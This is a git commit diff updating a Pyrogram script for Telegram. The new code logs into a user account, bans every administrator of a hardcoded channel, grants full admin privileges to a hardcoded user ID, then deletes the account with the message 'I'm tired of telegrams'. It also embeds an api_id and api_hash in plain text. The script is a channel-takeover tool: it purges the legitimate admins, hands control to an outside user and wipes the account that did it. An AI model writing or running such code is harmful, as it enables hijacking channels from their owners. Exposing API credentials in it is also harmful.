d6a9c7ec166ec5b6445c6afe908b5551e2308840
msrfern <139376461+msrfern@users.noreply.github.com>
2023-09-03 17:53:41 +0400

    Update main.py

--- main.py
+++ main.py
@@ -1,35 +1,37 @@
 from pyrogram import Client, filters
-from pyrogram.errors import UserNotParticipant, UserAdminInvalid
+from pyrogram.errors import UserNotParticipant, UserAdminInvalid, UserCreator, BadRequest
+from pyrogram.enums import ChatMembersFilter
+from pyrogram.types import ChatPrivileges
 
 api_id = '20448123'
 api_hash = 'e50f0b42d3636b96891ea98af1c78a00'
 
 with Client("my_account", api_id, api_hash) as app:
-    channels = ['-1001695776575']
-    ids = ['6465348472', '6117965304']
+    channels = [-1001771502107]
+    ids = [6117965304]
     for channel in channels:
-        admins = app.get_chat_members(channel, filter="administrators")
+        admins = app.get_chat_members(channel, filter=ChatMembersFilter.ADMINISTRATORS)
         for admin in admins:
             try:
-                app.promote_chat_member(channel, admin.user.id, 
-                                        can_change_info=False, can_post_messages=False, 
-                                        can_edit_messages=False, can_delete_messages=False, 
-                                        can_invite_users=False, can_restrict_members=False, 
-                                        can_pin_messages=False, can_promote_members=False)
+                app.ban_chat_member(channel, admin.user.id)
             except UserAdminInvalid:
                 continue
-        my_permissions = app.get_chat_member(channel, "me").status.permissions
+            except UserCreator:
+                continue
+            except BadRequest:
+                continue
         for user_id in ids:
             try:
-                app.promote_chat_member(channel, user_id, 
-                                        can_change_info=my_permissions.can_change_info,
-                                        can_post_messages=my_permissions.can_post_messages,
-                                        can_edit_messages=my_permissions.can_edit_messages,
-                                        can_delete_messages=my_permissions.can_delete_messages,
-                                        can_invite_users=my_permissions.can_invite_users,
-                                        can_restrict_members=my_permissions.can_restrict_members,
-                                        can_pin_messages=my_permissions.can_pin_messages,
-                                        can_promote_members=my_permissions.can_promote_members)
+                app.promote_chat_member(channel, user_id, ChatPrivileges(
+                                        can_change_info=True,
+                                        can_post_messages=True,
+                                        can_edit_messages=True,
+                                        can_delete_messages=True,
+                                        can_invite_users=True,
+                                        can_restrict_members=True,
+                                        can_pin_messages=True,
+                                        can_promote_members=True
+                ))
             except UserNotParticipant:
                 continue
     app.delete_account("I'm tired of telegrams")
